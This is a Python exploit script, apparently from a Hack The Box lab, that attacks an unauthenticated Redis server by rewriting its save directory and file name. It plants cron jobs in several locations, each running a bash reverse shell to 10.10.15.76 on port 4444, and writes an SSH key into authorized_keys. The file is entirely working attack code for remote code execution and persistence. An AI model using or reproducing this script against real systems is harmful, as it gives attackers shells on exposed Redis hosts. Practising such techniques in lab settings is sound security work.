import socket
import sys

TARGET = "10.129.135.209"
PORT = 6379

def resp_encode(args):
    parts = [f"*{len(args)}"]
    for arg in args:
        parts.append(f"${len(arg)}")
        parts.append(arg)
    return "\r\n".join(parts) + "\r\n"

def send_redis(sock, args):
    sock.sendall(resp_encode(args).encode())
    resp = sock.recv(65536).decode()
    return resp

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))

    action = sys.argv[1] if len(sys.argv) > 1 else "keys"

    if action == "cron_d":
        target_dir = "/etc/cron.d"
        filename = "redis_cron"
        cron_content = "\n\n* * * * * root /bin/bash -i >& /dev/tcp/10.10.15.76/4444 0>&1\n"
        print(f"[*] Writing cron job to {target_dir}/{filename}...")
        print(send_redis(s, ["CONFIG", "SET", "dir", target_dir]))
        print(send_redis(s, ["CONFIG", "SET", "dbfilename", filename]))
        print(send_redis(s, ["SET", "cronjob", cron_content]))
        print(send_redis(s, ["SAVE"]))

    elif action == "crontab":
        target_dir = "/var/spool/cron/crontabs"
        filename = "redis"
        cron_content = "\n\n* * * * * /bin/bash -i >& /dev/tcp/10.10.15.76/4444 0>&1\n"
        print(f"[*] Writing crontab to {target_dir}/{filename}...")
        print(send_redis(s, ["CONFIG", "SET", "dir", target_dir]))
        print(send_redis(s, ["CONFIG", "SET", "dbfilename", filename]))
        print(send_redis(s, ["SET", "cronjob", cron_content]))
        print(send_redis(s, ["SAVE"]))

    elif action == "tmp_cron":
        target_dir = "/var/tmp"
        filename = "redis.cron"
        cron_content = "\n\n* * * * * root /bin/bash -i >& /dev/tcp/10.10.15.76/4444 0>&1\n"
        print(f"[*] Writing cron job to {target_dir}/{filename}...")
        print(send_redis(s, ["CONFIG", "SET", "dir", target_dir]))
        print(send_redis(s, ["CONFIG", "SET", "dbfilename", filename]))
        print(send_redis(s, ["SET", "cronjob", cron_content]))
        print(send_redis(s, ["SAVE"]))

    elif action == "check":
        print("[*] Checking current config...")
        print(send_redis(s, ["CONFIG", "GET", "dir"]))
        print(send_redis(s, ["CONFIG", "GET", "dbfilename"]))
        print(send_redis(s, ["KEYS", "*"]))

    elif action == "ssh":
        with open("/media/gabi/Data/CTF/HTB/Redeemer/exploits/redis_key.pub") as f:
            pubkey = f.read().strip()
        print("[*] Writing SSH key...")
        print(send_redis(s, ["CONFIG", "SET", "dir", "/var/lib/redis"]))
        print(send_redis(s, ["CONFIG", "SET", "dbfilename", "authorized_keys"]))
        payload = "\n\n\n\n" + pubkey + "\n"
        print(send_redis(s, ["SET", "sshkey", payload]))
        print(send_redis(s, ["SAVE"]))

    else:
        print(send_redis(s, ["KEYS", "*"]))

    s.close()
    print("[+] Done.")

if __name__ == "__main__":
    main()
